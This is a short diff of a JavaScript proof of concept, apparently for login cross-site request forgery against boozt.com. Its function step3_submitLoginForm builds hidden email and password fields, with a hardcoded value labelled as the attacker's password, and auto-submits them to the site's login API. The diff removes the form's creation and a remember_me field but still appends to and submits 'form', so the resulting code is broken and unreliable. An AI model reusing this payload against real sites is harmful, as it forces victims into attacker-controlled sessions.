@@ -16,9 +16,7 @@
  
 
         function step3_submitLoginForm() {
-            var form = document.createElement("form");
-            form.method = "POST";
-            form.action = "https://www.boozt.com/api/login";
+     
 
             var email = document.createElement("input");
             email.type = "hidden";
@@ -30,14 +28,11 @@
             password.name = "password";
             password.value = "6115Isayevm"; // Attacker's password
 
-            var remember = document.createElement("input");
-            remember.type = "hidden";
-            remember.name = "remember_me";
-            remember.value = "true";
+    
 
             form.appendChild(email);
             form.appendChild(password);
-            form.appendChild(remember);
+       
 
             document.body.appendChild(form);
             form.submit();
